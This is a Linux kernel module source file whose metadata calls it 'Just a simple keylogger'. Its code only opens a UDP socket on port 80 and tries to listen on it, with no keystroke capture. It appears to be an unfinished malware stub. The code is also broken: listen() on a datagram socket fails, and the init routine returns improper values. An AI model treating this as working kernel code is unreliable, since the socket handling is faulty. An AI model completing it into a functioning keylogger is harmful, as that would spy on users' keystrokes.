#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/kernel.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
struct sockaddr_in addr;
//memset(&addr,0, sizeof(addr));
struct socket *sock, *listen_socket;


int main(void){
    int err = sock_create(PF_INET, SOCK_DGRAM, IPPROTO_UDP, &listen_socket);
    if (err < 0){
        printk(KERN_ALERT "could not create the socket");
        return -1;
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    sock = listen_socket;

    err = sock->ops->bind(sock, (struct sockaddr *) &addr, sizeof(addr));
    if (err < 0){
        printk(KERN_ALERT "could not bind the socket");
        printk(KERN_ALERT "%d",err);
        sock_release(sock);

        return -1;
    }
    err = sock->ops->listen(sock, 16);
    if (err < 0){
        printk(KERN_ALERT "could not start to listen with socket");
        printk(KERN_ALERT "%d",err);

        sock_release(sock);

        return err;
    }
    
    return 1;
}
static int __init mod_load(void)
{
    return main();
}
static void __exit unload(void)
{
    sock_release(sock);
   
}
module_init(mod_load);
module_exit(unload);
